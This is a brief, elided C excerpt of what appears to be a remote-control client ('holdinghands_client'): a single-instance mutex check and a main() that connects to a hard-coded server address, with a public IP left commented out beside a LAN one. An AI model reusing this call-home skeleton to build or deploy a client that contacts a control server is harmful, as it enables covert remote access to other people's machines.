...
void  HHBeginKernel(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	...
	HANDLE hMutex = CreateMutex(NULL,FALSE,"holdinghands_client");

	if(hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	{	
#ifdef _DEBUG
		MessageBox(NULL,"An instance is already running","Error!",IDOK);
#endif
		return ;
	}
	/*****************Run Kernel Module****************/
...
int main()
{
	//HHBeginKernel("81.68.224.152",10086,0);
	HHBeginKernel("192.168.1.235",10086,0);
	return 0;
}
